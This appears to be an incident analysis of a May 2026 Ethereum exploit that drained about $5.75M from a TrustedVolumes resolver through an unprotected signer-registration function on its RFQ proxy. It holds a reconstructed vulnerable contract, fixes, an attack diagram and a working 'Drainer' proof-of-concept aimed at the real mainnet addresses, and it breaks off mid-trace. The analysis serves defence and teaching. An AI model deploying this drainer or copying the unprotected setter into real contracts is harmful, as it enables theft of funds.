# TrustedVolumes — RFQ Order-Signer Access Control Bypass Analysis

| Item | Details |
|------|------|
| **Date** | 2026-05-07 00:47:35 UTC |
| **Protocol** | TrustedVolumes (RFQ market maker / 1inch resolver, *not* 1inch core) |
| **Chain** | Ethereum Mainnet |
| **Loss (this tx)** | **~$5.75M**: 1,291.16 WETH + 206,282.45 USDT + 16.94 WBTC + 1,268,771.49 USDC |
| **Loss (full campaign)** | ~$5.87M – $6.7M across three exploiter wallets |
| **Attacker (EOA)** | [0xC3EBDdEa...9100](https://etherscan.io/address/0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100) (TrustedVolumes Exploiter 1) |
| **Attack Contract** | [0xd4d5db5E...1e95](https://etherscan.io/address/0xd4d5db5ec65272b26f756712247281515f211e95) (deployed *by* this tx — entire exploit runs in the constructor) |
| **Attack Tx** | [0xc5c61b3a...0513](https://etherscan.io/tx/0xc5c61b3ac39d854773b9dc34bd0cdbc8b5bbf75f18551802a0b5881fcb990513) (CREATE — `to` field empty) |
| **Vulnerable Contract (RFQ Proxy)** | [0xeEeEEe53...1756](https://etherscan.io/address/0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756) (proxy) → [0x88eb2800...60d8](https://etherscan.io/address/0x88eb28009351Fb414A5746F5d8CA91cdc02760d8) (impl) — TrustedVolumes "RFQ Exchange Proxy", unverified |
| **TrustedVolumes Resolver** | [0x9bA0CF15...Da31](https://etherscan.io/address/0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31) (pre-approved unlimited WETH/USDT/WBTC/USDC to the RFQ Proxy) |
| **Attack Block** | 25,039,670 |
| **Root Cause** | `registerAllowedOrderSigner(address,bool)` (selector `0xea7faa61`) on the RFQ Proxy has **no access control** — anyone can register themselves as a privileged order signer. Combined with the resolver's pre-existing unlimited approvals, the attacker authored RFQ orders pricing huge maker-side outflows for ~1 wei of taker-side input and the proxy filled them via `transferFrom(resolver, attacker, …)`. |
| **Attribution** | Same operator as the March 2025 1inch Fusion V1 resolver exploit (per Blockaid / CertiK / 1inch). |
| **Trace Source** | [Phalcon Explorer](https://app.blocksec.com/phalcon/explorer/tx/eth/0xc5c61b3ac39d854773b9dc34bd0cdbc8b5bbf75f18551802a0b5881fcb990513) |

---

## 1. Vulnerability Overview

TrustedVolumes is a market maker that supplies RFQ liquidity to 1inch and other aggregators. To do so it operates two contracts:

- a **Resolver** at `0x9bA0CF15…Da31` — holds the inventory and grants unlimited ERC-20 approvals to the RFQ proxy so the proxy can pull funds during fills, and
- an **RFQ Exchange Proxy** at `0xeEeEEe53…1756` (impl `0x88eb2800…60d8`) — receives signed RFQ orders, validates the signer is on an "allowed order signer" allowlist, then executes the swap by `transferFrom`-ing the maker side from the resolver and the taker side from the taker.

The proxy maintains an `allowedOrderSigners[address] => bool` set and exposes:

```solidity
// selector: 0xea7faa61
function registerAllowedOrderSigner(address signer, bool allowed) external;
```

**The flaw.** `registerAllowedOrderSigner` is missing access control: there is no `onlyOwner`, no `onlyMaker`, no signature gate. Any externally owned account or contract can call it, set themselves as `allowed`, and then sign RFQ orders that the proxy accepts as legitimate.

**The blast radius.** Because the resolver had granted `type(uint256).max` allowance to the proxy for WETH, USDT, WBTC, and USDC, a privileged order signer can produce orders that price the maker-side outflow at any rate — including 1 wei of the taker asset for the resolver's entire balance of the maker asset. Chainlink price feeds *are* read inside the fill, but only as informational data emitted in the fill event; they do not gate the trade.

The attacker:

1. Registered themselves (as `0xC3EBDdEa…9100`) as an allowed order signer.
2. Signed four RFQ orders priced at 1 wei of USDC for, respectively, all of the resolver's WETH, USDT, WBTC, and USDC.
3. Submitted those four fills via a single CREATE transaction whose constructor seeded the contract with 4 wei of USDC, called `registerAllowedOrderSigner`, executed all four fills, unwrapped WETH, and forwarded everything to the attacker EOA.

Net effect in one transaction: ~$5.75M out of ~$5.78M in the resolver's combined inventory of those four tokens (≈99.5% of each) drained to the attacker.

---

## 2. Vulnerable Code Analysis

The RFQ proxy implementation at `0x88eb2800…60d8` is unverified. Behavior is reconstructed from the transaction trace and confirmed against the on-chain bytecode (selectors `0xea7faa61` and `0x4112e1c2` both observed in the proxy's dispatcher).

### 2.1 `registerAllowedOrderSigner` — Missing Access Control (Core Vulnerability)

```solidity
// ❌ Vulnerable RFQ proxy (TrustedVolumes "RFQ Exchange Proxy")
// selector: 0xea7faa61
mapping(address => bool) public allowedOrderSigner;

function registerAllowedOrderSigner(address signer, bool allowed) external {
    // ❌ ROOT CAUSE: no access control whatsoever.
    // Any caller can mark any address as an allowed RFQ order signer.
    // This single line is the entire exploit primitive.
    allowedOrderSigner[signer] = allowed;
    emit AllowedOrderSignerUpdated(msg.sender, signer, allowed);
}
```

**Patched form:**

```solidity
// ✅ Restrict to the protocol owner / multisig.
function registerAllowedOrderSigner(address signer, bool allowed)
    external
    onlyOwner   // or onlyRole(SIGNER_ADMIN_ROLE)
{
    allowedOrderSigner[signer] = allowed;
    emit AllowedOrderSignerUpdated(msg.sender, signer, allowed);
}
```

**Why this is catastrophic.** "Allowed order signer" is not a marketing label — it is the *only* check that distinguishes a legitimate RFQ price quote from an arbitrary instruction to move maker funds. A contract that lets the public write into that allowlist has effectively pre-signed unlimited approvals to whoever shows up first.

### 2.2 `fillRfqOrder` — Allowlist Check Without Price Sanity Bound

The fill function (selector `0x4112e1c2`, custom to this proxy and not in any public 4byte database) takes 11 fields:

```solidity
// ❌ Reconstructed signature for selector 0x4112e1c2
// Confirmed against trace: ecrecover yields the attacker EOA, then proxy
// performs maker-side and taker-side transferFrom against pre-approved balances.
function fillRfqOrder(
    address takerAsset,     // USDC in all 4 fills
    address makerAsset,     // WETH | USDT | WBTC | USDC
    uint256 takerAmount,    // 1 (one wei of USDC — effectively free)
    uint256 makerAmount,    // resolver's full balance of makerAsset
    address taker,          // attacker contract
    address maker,          // 0x9bA0CF15…Da31 (TrustedVolumes Resolver)
    uint256 deadline,       // 0x69fbe148 (~2026-05-12)
    uint256 nonce,          // 1, 2, 3, 4
    uint8   v,
    bytes32 r,
    bytes32 s,
    uint256 orderType       // 2
) external {
    bytes32 orderHash = _hashOrder(takerAsset, makerAsset, takerAmount,
                                   makerAmount, taker, maker, deadline, nonce);
    address signer = ecrecover(orderHash, v, r, s);

    // ❌ This is the ONLY authorization gate. Combined with §2.1, broken.
    require(allowedOrderSigner[signer], "signer not allowed");

    // — chainlink reads happen here for both assets, but their results are only
    //   emitted in the fill event for off-chain auditing; they do NOT bound
    //   makerAmount/takerAmount or revert on extreme deviations. —
    (, int256 takerPrice,,,) = ITAKERFEED.latestRoundData();
    (, int256 makerPrice,,,) = IMAKERFEED.latestRoundData();

    // The actual settlement: transferFrom against the resolver's pre-existing
    // unlimited approval to this proxy.
    IERC20(makerAsset).transferFrom(maker, taker, makerAmount);
    IERC20(takerAsset).transferFrom(taker, maker, takerAmount);

    emit RfqFilled(signer, orderHash, taker, nonce, takerPrice, makerPrice);
}
```

**Patched form:**

```solidity
// ✅ Add a price-deviation guard so even an allowlisted signer cannot
//    settle obviously off-market trades, plus per-signer/per-maker scoping.
require(allowedOrderSigner[signer], "signer not allowed");
require(_signerCanSignFor[signer][maker], "signer not authorized for maker");

uint256 fairTaker = _quoteFair(makerAsset, takerAsset, makerAmount,
                               makerPrice, takerPrice);
require(takerAmount >= fairTaker * (BPS - MAX_DEVIATION_BPS) / BPS,
        "price deviation too large");
```

**The Problem.** Treating an `ecrecover`-derived address against an open allowlist as authorization is the same category error as the Ekubo `IPayer.pay` bug from two days earlier (2026-05-05): the channel is authenticated (this is a real ECDSA signature), but the **scope** is unbounded. There is no binding between (signer, maker, asset, price) — a single `allowedOrderSigner = true` flag implicitly approves every conceivable order against every maker that pre-approved this proxy.

### 2.3 Resolver Pre-Approvals — The Loaded Gun

```solidity
// In the TrustedVolumes Resolver constructor / setup, executed long before the attack.
// (Standard market-maker pattern: pre-approve so the proxy can pull liquidity
//  during fills without each fill needing a fresh approval signature.)
WETH.approve(rfqProxy, type(uint256).max);
USDC.approve(rfqProxy, type(uint256).max);
USDT.approve(rfqProxy, type(uint256).max);
WBTC.approve(rfqProxy, type(uint256).max);
```

This is not itself a bug — it is the conventional way an RFQ market-maker funds a settlement contract. But it converts §2.1 from "you can write to a mapping" into "you can drain the entire inventory in a single CREATE transaction". The `transferFrom` calls inside `fillRfqOrder` succeed because `msg.sender` at the WETH/USDT/WBTC/USDC layer is the proxy, which holds an unlimited allowance.

### 2.4 Complete Reconstructed Vulnerable RFQ Proxy

The proxy at `0xeEeEEe53…1756` and its implementation at `0x88eb2800…60d8` are both unverified (Etherscan: "Verify and Publish"; Sourcify and Blockscout return "Files have not been found"). The reconstruction below is derived from (a) selectors visible in the runtime bytecode, (b) the call/transfer/`ecrecover` pattern observed in the cast trace, and (c) the chainlink feed addresses observed being read for each asset.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.33;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IChainlinkFeed {
    function latestRoundData() external view returns (
        uint80 roundId, int256 answer, uint256 startedAt,
        uint256 updatedAt, uint80 answeredInRound
    );
}

/// @title  Vulnerable TrustedVolumes RFQ Exchange Proxy (reconstructed)
/// @dev    Storage layout matches the impl at 0x88eb2800…60d8 (delegatecall target).
///         Uses transparent-proxy / EIP-1967-style indirection (proxy at 0xeEeEEe53…1756).
contract VulnerableRFQExchange {
    /// Storage —————————————————————————————————————————————————————————————

    // ❌ The single source of authorization for all RFQ fills.
    //    Anyone can write to this mapping via §registerAllowedOrderSigner.
    mapping(address signer => bool allowed) public allowedOrderSigner;

    // Replay protection: each (signer, nonce) is one-shot.
    mapping(address signer => mapping(uint256 nonce => bool used)) public consumedNonces;

    // Per-asset Chainlink USD feeds. Read on every fill, but result is informational.
    mapping(address token => IChainlinkFeed) public priceFeed;

    /// Events ——————————————————————————————————————————————————————————————

    event AllowedOrderSignerUpdated(address indexed by, address indexed signer, bool allowed);

    // 0x908e04b7fca534332a280849447da5bdff4d19546aff4b134481c5b48993cc8a
    event RfqFilled(
        address indexed signer,
        bytes32 indexed orderHash,
        address taker,
        uint256 nonce
    );

    /// Errors ——————————————————————————————————————————————————————————————

    error SignerNotAllowed();
    error OrderExpired();
    error NonceAlreadyUsed();
    error TransferFailed();

    /// Privileged setter — selector 0xea7faa61 — THE BUG.
    /// Marks `signer` as authorized to author RFQ orders that this proxy will fill
    /// against any maker that has pre-approved this proxy for the maker asset.
    function registerAllowedOrderSigner(address signer, bool allowed) external {
        // ❌ ROOT CAUSE: no auth modifier. Should be `onlyOwner`, or scoped to a
        //    per-maker mapping (`makerSigner[msg.sender][signer] = allowed`).
        //    A single SSTORE is the entire exploit primitive.
        allowedOrderSigner[signer] = allowed;
        emit AllowedOrderSignerUpdated(msg.sender, signer, allowed);
    }

    /// RFQ fill — selector 0x4112e1c2 — accepts an ECDSA-signed order whose only
    /// authentication is "is the recovered address in `allowedOrderSigner`?".
    /// Settlement uses the maker's pre-existing unlimited approval to this proxy.
    function fillRfqOrder(
        address takerAsset,    // attacker provided 1 wei of USDC for all 4 fills
        address makerAsset,    // WETH / USDT / WBTC / USDC
        uint256 takerAmount,   // 1
        uint256 makerAmount,   // resolver's full balance for the asset
        address taker,         // attacker-controlled contract
        address maker,         // TrustedVolumes Resolver
        uint256 deadline,
        uint256 nonce,
        uint8   v,
        bytes32 r,
        bytes32 s,
        uint256 orderType      // 2 in all four observed fills
    ) external {
        if (block.timestamp > deadline) revert OrderExpired();

        bytes32 orderHash = _hashOrder(
            takerAsset, makerAsset, takerAmount, makerAmount,
            taker, maker, deadline, nonce, orderType
        );
        address signer = ecrecover(orderHash, v, r, s);

        // ❌ ONLY authorization gate. With §registerAllowedOrderSigner unprotected,
        //    the attacker placed themselves in this set seconds earlier.
        if (!allowedOrderSigner[signer]) revert SignerNotAllowed();

        if (consumedNonces[signer][nonce]) revert NonceAlreadyUsed();
        consumedNonces[signer][nonce] = true;

        // ❌ Chainlink prices are read but never compared to the trade ratio.
        //    A fill of 1 wei USDC for 1,291 WETH passes through unchallenged
        //    because no `require(takerAmount >= fairTaker * (1 - tol))` follows.
        IChainlinkFeed takerFeed = priceFeed[takerAsset];
        IChainlinkFeed makerFeed = priceFeed[makerAsset];
        (, int256 takerPrice,,,) = takerFeed.latestRoundData();
        (, int256 makerPrice,,,) = makerFeed.latestRoundData();
        // (price values are forwarded into the event below — that's it.)

        // Settlement: pull maker side from the maker (succeeds because of the
        // resolver's unlimited pre-approval), pull taker side from the taker.
        if (!IERC20(makerAsset).transferFrom(maker, taker, makerAmount)) revert TransferFailed();
        if (!IERC20(takerAsset).transferFrom(taker, maker, takerAmount)) revert TransferFailed();

        emit RfqFilled(signer, orderHash, taker, nonce);
    }

    function _hashOrder(
        address takerAsset, address makerAsset,
        uint256 takerAmount, uint256 makerAmount,
        address taker, address maker,
        uint256 deadline, uint256 nonce, uint256 orderType
    ) internal view returns (bytes32) {
        // EIP-712 domain + struct hash — exact form not material to the bug.
        return keccak256(abi.encode(
            block.chainid, address(this),
            takerAsset, makerAsset,
            takerAmount, makerAmount,
            taker, maker,
            deadline, nonce, orderType
        ));
    }
}
```

**The fix (drop-in patch):**

```solidity
// ✅ 1. Restrict the privileged setter to the protocol owner / multisig,
//       OR scope it per-maker so a leak in one maker's signer list cannot
//       reach another maker's funds.
mapping(address maker => mapping(address signer => bool)) public makerSigner;

function registerAllowedOrderSigner(address signer, bool allowed) external {
    makerSigner[msg.sender][signer] = allowed;             // each maker manages its own signers
    emit AllowedOrderSignerUpdated(msg.sender, signer, allowed);
}

// ✅ 2. Bind the signer to the maker AND enforce a price band.
function fillRfqOrder(/* … */) external {
    /* … hash + ecrecover unchanged … */
    if (!makerSigner[maker][signer]) revert SignerNotAuthorizedForMaker();   // ← per-maker scope

    (, int256 takerPx,,,) = priceFeed[takerAsset].latestRoundData();
    (, int256 makerPx,,,) = priceFeed[makerAsset].latestRoundData();
    uint256 fairTaker = _fairTaker(makerAsset, takerAsset,
                                   makerAmount, uint256(takerPx), uint256(makerPx));
    require(takerAmount * BPS >= fairTaker * (BPS - MAX_DEVIATION_BPS),
            "price deviation too large");                                    // ← enforced
    /* … settlement unchanged … */
}
```

### 2.5 Bytecode Evidence

```
RFQ Exchange Proxy : 0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756
RFQ Exchange Impl  : 0x88eb28009351Fb414A5746F5d8CA91cdc02760d8  (delegatecall target)
Resolver           : 0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31
Source verification : NO (Etherscan / Sourcify / Blockscout) for all three
Selectors observed in proxy/impl dispatcher:
   0xea7faa61   — registerAllowedOrderSigner(address,bool)        ← unprotected setter
   0x4112e1c2   — fillRfqOrder(...)  (custom — not in 4byte/openchain)
Chainlink feeds bound to the four assets (read in trace, not enforced):
   USDC : 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6
   WETH : 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419
   USDT : 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D
   WBTC : 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c
Event signature emitted on each fill:
   topic0 = 0x908e04b7fca534332a280849447da5bdff4d19546aff4b134481c5b48993cc8a
```

The trace (§ 8.3) shows the runtime executing exactly the sequence in `fillRfqOrder` above:
`ecrecover` returns the attacker EOA → `latestRoundData` reads (results discarded) → `transferFrom(resolver → attacker, makerAmount)` and `transferFrom(attacker → resolver, 1)` → topic-0 event. There is no branch in between the price reads and the transfers, confirming the price reads are not enforced.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker funded EOA `0xC3EBDdEa…9100` (nonce = 0 entering this tx — first ever transaction from this EOA).
- Attacker pre-funded the EOA with at least 4 USDC (the constructor needs 4 wei of USDC to satisfy the taker-side payment for the four fills).
- Off-chain: attacker computed and signed four RFQ order hashes — one for each token to drain — pricing each as "1 wei USDC for the resolver's full balance of asset X".

### 3.2 Execution Phase (one `CREATE` tx, no `to` address)

```
[Step 1] Deploy attack contract via CREATE
┌──────────────────────────────────────────────────────────────────┐
│ EOA 0xC3EBDdEa…9100                                              │
│   nonce 0 → CREATE → 0xd4d5db5E…1e95 (attack contract)          │
│   constructor args: target=0x9bA0CF15…Da31,                      │
│                     tokens   = [WETH,USDT,WBTC,USDC],            │
│                     amounts  = [1291.16e18, 206282e6,            │
│                                 16.94e8, 1268771e6],             │
│                     takerAmts= [1, 1, 1, 1]   ← 1 wei each      │
│                     deadlines= [0x69fbe148] × 4,                 │
│                     v        = [27, 28, 28, 27],                 │
│                     r,s      = 4 ECDSA signatures by the EOA     │
└──────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
[Step 2] Constructor: gain signer privilege
┌──────────────────────────────────────────────────────────────────┐
│ ATTACK_CONTRACT → RFQ Proxy.registerAllowedOrderSigner(           │
│                       0xC3EBDdEa…9100, true)                     │
│   ❌ no access control → succeeds                                 │
└──────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
[Step 3] Constructor: seed taker-side inventory
┌──────────────────────────────────────────────────────────────────┐
│ USDC.transferFrom(attacker EOA → attack contract, 4)             │
│ USDC.approve(RFQ Proxy, 4)                                       │
│ (only 4 wei needed total: 1 per fill × 4 fills)                  │
└──────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
[Step 4] Loop 4 times: fill an RFQ order per token
┌──────────────────────────────────────────────────────────────────┐
│ for token in [WETH, USDT, WBTC, USDC]:                           │
│   read RESOLVER.balanceOf(token)        // sanity                │
│   read RESOLVER.allowance(token, proxy) // == 2^256-1            │
│   RFQ Proxy.fillRfqOrder(                                        │
│       takerAsset=USDC, makerAsset=token,                         │
│       takerAmount=1, makerAmount=RESOLVER_BALANCE,               │
│       taker=attack contract, maker=RESOLVER,                     │
│       deadline, nonce=i+1, v, r, s, orderType=2)                 │
│     ├─ ecrecover → 0xC3EBDdEa…9100                               │
│     ├─ allowedOrderSigner[0xC3EB…]==true ✓                       │
│     ├─ chainlink reads (informational only)                      │
│     ├─ token.transferFrom(RESOLVER → attack contract, big)      │
│     └─ USDC.transferFrom(attack contract → RESOLVER, 1 wei)      │
└──────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
[Step 5] Constructor tail: unwrap and forward to EOA
┌──────────────────────────────────────────────────────────────────┐
│ WETH.withdraw(1291.16e18)        // unwrap to ETH                │
│ ETH.send(attacker EOA, balance)  // 1,291.16 ETH                 │
│ for token in [USDT, WBTC, USDC]:                                 │
│     token.transfer(attacker EOA, attack contract balance)         │
│ (constructor returns minimal runtime: STOP / REVERT only)         │
└──────────────────────────────────────────────────────────────────┘
```

### 3.3 Results

| Token | Drained | Resolver pre-attack balance | % of inventory |
|-------|---------|------------------------------|----------------|
| WETH  | 1,291.16 (≈ $2.93M) | 1,304.20 | 99.0% |
| USDT  | 206,282.45 (≈ $206K) | 208,366.11 | 99.0% |
| WBTC  | 16.94 (≈ $1.34M)    | 17.11 | 99.0% |
| USDC  | 1,268,771.49 (≈ $1.27M) | 1,281,587.36 | 99.0% |
| **Total** | **≈ $5.75M** in this single tx | | |

A small dust balance (~1% of each asset) was left in the resolver — likely because the attacker hard-coded `makerAmount` from a slightly earlier balance snapshot. Total attacker proceeds across the broader campaign (multiple exploiter wallets and additional resolver positions): ~$5.87M – $6.7M.

---

## 4. PoC Sketch (Reconstructed from CREATE Bytecode + Trace)

The attack contract is unverified. The reconstructed constructor matches the trace exactly:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.33;

interface IRFQProxy {
    function registerAllowedOrderSigner(address signer, bool allowed) external;
    function fillRfqOrder(
        address takerAsset, address makerAsset,
        uint256 takerAmount, uint256 makerAmount,
        address taker, address maker,
        uint256 deadline, uint256 nonce,
        uint8 v, bytes32 r, bytes32 s,
        uint256 orderType
    ) external;
}

interface IWETH {
    function withdraw(uint256) external;
}

contract Drainer {
    address constant RFQ_PROXY = 0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756;
    address constant USDC      = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH      = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    constructor(
        address resolver,           // 0x9bA0CF15…Da31
        address[] memory tokens,    // [WETH, USDT, WBTC, USDC]
        uint256[] memory makerAmts, // resolver inventories
        uint256[] memory takerAmts, // [1, 1, 1, 1]
        uint256[] memory deadlines, // [0x69fbe148] × 4
        uint256[] memory orderTypes,// [2, 2, 2, 2]
        uint8[]   memory v,
        bytes32[] memory r,
        bytes32[] memory s
    ) {
        // Step 2: gain signer privilege — registerAllowedOrderSigner has no auth.
        IRFQProxy(RFQ_PROXY).registerAllowedOrderSigner(msg.sender, true);

        // Step 3: seed taker-side inventory (1 wei USDC per fill).
        IERC20(USDC).transferFrom(msg.sender, address(this), tokens.length);
        IERC20(USDC).approve(RFQ_PROXY, tokens.length);

        // Step 4: drain each maker asset.
        for (uint256 i = 0; i < tokens.length; ++i) {
            if (IERC20(tokens[i]).allowance(resolver, RFQ_PROXY) >= makerAmts[i]) {
                IRFQProxy(RFQ_PROXY).fillRfqOrder(
                    USDC, tokens[i],
                    takerAmts[i], makerAmts[i],
                    address(this), resolver,
                    deadlines[i], i + 1,
                    v[i], r[i], s[i],
                    orderTypes[i]
                );
            }
        }

        // Step 5: unwrap WETH and sweep to the EOA.
        uint256 wethBal = IERC20(WETH).balanceOf(address(this));
        if (wethBal > 0) IWETH(WETH).withdraw(wethBal);
        if (address(this).balance > 0) {
            (bool ok,) = msg.sender.call{value: address(this).balance}("");
            require(ok, "ETH send failed");
        }
        for (uint256 i = 1; i < tokens.length; ++i) { // skip WETH (already unwrapped)
            uint256 bal = IERC20(tokens[i]).balanceOf(address(this));
            if (bal > 0) IERC20(tokens[i]).transfer(msg.sender, bal);
        }
    }
}
```

The `registerAllowedOrderSigner(...)` call at the top of the constructor is the entire exploit primitive; everything below it is post-exploitation logistics.

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|---------------|----------|-----|
| V-01 | `registerAllowedOrderSigner` lacks access control (anyone can become an "allowed RFQ order signer") | **CRITICAL** | CWE-284 (Improper Access Control) |
| V-02 | RFQ fills priced via ECDSA-signed orders without a price-deviation bound (Chainlink reads are emitted, not enforced) | **HIGH** | CWE-20 (Improper Input Validation) |
| V-03 | Maker grants unlimited approvals to a settlement proxy whose authorization model is binary (allowed signer y/n), not scoped to (signer, maker, asset, price) | **HIGH** | CWE-285 (Improper Authorization) |

### V-01: Missing Access Control on Privileged Setter

- **Description**: The function that controls who is allowed to author orders against the maker's pre-approved funds is callable by anyone.
- **Impact**: Any address can self-promote to "allowed signer" and then sign arbitrary RFQ orders. Combined with the resolver's unlimited approvals, this is equivalent to publishing the maker's signing key.
- **Attack Condition**: A live RFQ proxy with at least one maker that has pre-approved it for a non-trivial balance.

### V-02: Chainlink Prices Read but Not Enforced

- **Description**: `fillRfqOrder` reads Chainlink `latestRoundData` for both assets and includes them in the fill event, but does not compare `(makerAmount / takerAmount)` against the oracle ratio. A trade of 1 wei USDC for 1,291 WETH (off market by ~6 orders of magnitude) clears without revert.
- **Impact**: Even if V-01 were fixed, a single rogue or compromised allowed signer could sign self-dealing trades. A price-band check would have rejected all four fills.
- **Attack Condition**: Allowed-signer status (legitimately granted or, here, illegitimately self-granted).

### V-03: Coarse-Grained Allowlist Authorization

- **Description**: The proxy's authorization model is `mapping(address => bool)`. There is no per-maker, per-asset, or per-trade-size limit. One "true" entry is bearer-style permission over every maker that ever approved this proxy.
- **Impact**: V-01 escalates from "this proxy is drainable" to "all makers connected to this proxy are drainable simultaneously" — exactly the multi-token, multi-million-dollar payload observed.
- **Attack Condition**: Architectural; any time V-01 (or compromise of an existing signer) materializes.

---

## 6. Remediation

### Immediate Actions

**① Restrict `registerAllowedOrderSigner` to the maker/admin**

```solidity
// ✅ Either an OpenZeppelin Ownable / AccessControl pattern …
function registerAllowedOrderSigner(address signer, bool allowed)
    external
    onlyOwner
{
    allowedOrderSigner[signer] = allowed;
}

// ✅ … or, since this proxy serves *makers*, scope it to the maker itself:
mapping(address maker => mapping(address signer => bool)) public makerSigner;
function registerAllowedOrderSigner(address signer, bool allowed) external {
    makerSigner[msg.sender][signer] = allowed;       // each maker manages its own signers
}
function fillRfqOrder(... address maker ...) external {
    address signer = ecrecover(...);
    require(makerSigner[maker][signer], "not authorized for maker");  // scope the check
    ...
}
```

**② Bound prices in `fillRfqOrder`**

```solidity
uint256 fairTaker = _quoteFair(makerAsset, takerAsset, makerAmount,
                               makerPrice, takerPrice);
require(takerAmount * BPS >= fairTaker * (BPS - MAX_DEVIATION_BPS),
        "price deviation too large");          // e.g. MAX_DEVIATION_BPS = 200 (2%)
```

**③ User/maker-side mitigation (immediate)**

Maker must revoke the unlimited approvals to the compromised proxy until a fixed proxy is deployed:

```solidity
WETH.approve(0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756, 0);
USDC.approve(0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756, 0);
USDT.approve(0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756, 0);
WBTC.approve(0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756, 0);
```

### Structural Improvements

| Issue | Recommended Action |
|-------|--------------------|
| V-01 Missing access control | Mandatory `onlyOwner`/`onlyRole` on every state-changing setter; use Slither/Solhint's "external function with no auth and privileged effect" detector in CI. |
| V-02 Unbounded prices | Always enforce a price band against an oracle when settling against pre-approved maker funds. RFQ "trust the signer" is sufficient *only* in addition to such a bound, not as a replacement for it. |
| V-03 Bearer allowlist | Scope the allowlist as `(maker, signer)` tuples, optionally with `(asset, maxNotional, expiry)`. EIP-712 / Permit2-style typed orders should encode the maker explicitly so a leak in one maker's signer set cannot reach another maker's funds. |
| Process | The attacker behind this incident was the same operator as the March 2025 1inch Fusion V1 resolver exploit. Resolver/market-maker contract surface is a known target — every redeployment should pass a focused audit on the privileged-setter and signer-allowlist patterns. |

---

## 7. Lessons Learned

1. **`onlyOwner` is not a code-style preference, it is a security primitive.** Every public state-changing function on a privileged contract that is *not* meant to be world-writeable must declare its authorization at the type level. Tools (Slither, Mythril, custom CI rules) detect these in seconds; the cost of a missing modifier here was ~$5.75M in one transaction.

2. **An ECDSA signature authenticates *who*, not *what*.** A fill that requires a signature from an allowed signer is no safer than the allowlist that guards "allowed". If the allowlist is open, the signatures are theatrical — the attacker is the signer.

3. **Reading an oracle is not the same as enforcing an oracle.** TrustedVolumes' proxy fetched Chainlink prices for both assets on every fill — and emitted them — but never compared them to the trade. Telemetry without enforcement gives a false sense of safety to auditors and operators.

4. **Pre-approved settlement is high-risk surface; treat the settlement contract as if it were the maker's hot wallet.** The resolver effectively delegated full custody of its WETH/USDC/USDT/WBTC inventory to the RFQ proxy. The proxy must be held to a higher bar than a typical router: every privileged setter, every `transferFrom` path, and every signature scheme matters. Permit2-style per-call signatures with explicit `(maker, signer, asset, max amount, deadline)` tuples are the right model.

5. **Repeat attackers iterate on a theme.** The same operator hit 1inch Fusion V1 resolvers in March 2025 and TrustedVolumes' RFQ proxy in May 2026 — different bugs, same target class (1inch-adjacent market-maker settlement contracts). Defenders in this space should assume their resolver contracts are under continuous adversarial review.

---

## 8. On-Chain Verification

Verified with `cast` (Foundry 1.3.5) against `eth-mainnet.public.blastapi.io`.

### 8.1 Tx Basics

| Field | Value |
|-------|-------|
| Block | 25,039,670 |
| Block timestamp | 2026-05-07 00:47:35 UTC |
| Status | Success (`0x1`) |
| `from` | `0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100` (TrustedVolumes Exploiter 1) |
| `to` | *empty* (CREATE) |
| Created contract | `0xd4d5db5EC65272B26F756712247281515F211e95` |
| Attacker EOA nonce at entry | 0 (first ever transaction from this EOA) |
| Gas used | 783,611 |

### 8.2 Resolver Inventory: Drained vs Pre-Attack (block 25,039,669)

| Asset | Resolver pre-attack | Drained (this tx) | Resolver post-attack | % drained |
|-------|---------------------|-------------------|----------------------|-----------|
| WBTC | 1,711,020,727 sats (17.1102) | 1,693,910,519 sats (16.94) | ~17,110,208 sats (0.171) | 99.0% |
| USDC | 1,281,587,362,505 (1,281,587.36) | 1,268,771,488,367 (1,268,771.49) | ~12,815,874,138 (12,815.87) | 99.0% |
| USDT | 208,366,107,956 (208,366.11) | 206,282,446,876 (206,282.45) | ~2,083,661,080 (2,083.66) | 99.0% |
| WETH | 1,304,203,136,581,696,140,677 (1,304.20) | 1,291,161,105,215,879,179,270 (1,291.16) | ~13,042,031,365,816,961,407 (13.04) | 99.0% |

### 8.3 Trace-Derived Call Sequence (per `cast run`)

```
new <attack contract>@0xD4D5DB5E…1e95
├─ RFQ_Proxy(0xeEeEEe53…1756).registerAllowedOrderSigner(
│       0xC3EBDdEa…9100, true)               ← ❌ no auth, succeeds
│     └─ delegatecall → impl 0x88eb2800…60d8
├─ USDC.transferFrom(EOA → contract, 4)       ← seed 4 wei
├─ USDC.approve(RFQ_Proxy, 4)
├─ for token in [WETH, USDT, WBTC, USDC]:
│   ├─ token.balanceOf(RESOLVER)              ← sanity
│   ├─ token.allowance(RESOLVER, RFQ_Proxy)   ← == type(uint256).max
│   └─ RFQ_Proxy.fillRfqOrder(USDC, token, 1, big, contract,
│                              RESOLVER, deadline, nonce, v, r, s, 2)
│       ├─ delegatecall → impl 0x88eb2800…60d8
│       ├─ ecrecover(orderHash, v, r, s) ⇒ 0xC3EBDdEa…9100   ← attacker
│       ├─ allowedOrderSigner[0xC3EB…]    ⇒ true (just set)
│       ├─ Chainlink USDC/USD .latestRoundData()  ← read, not enforced
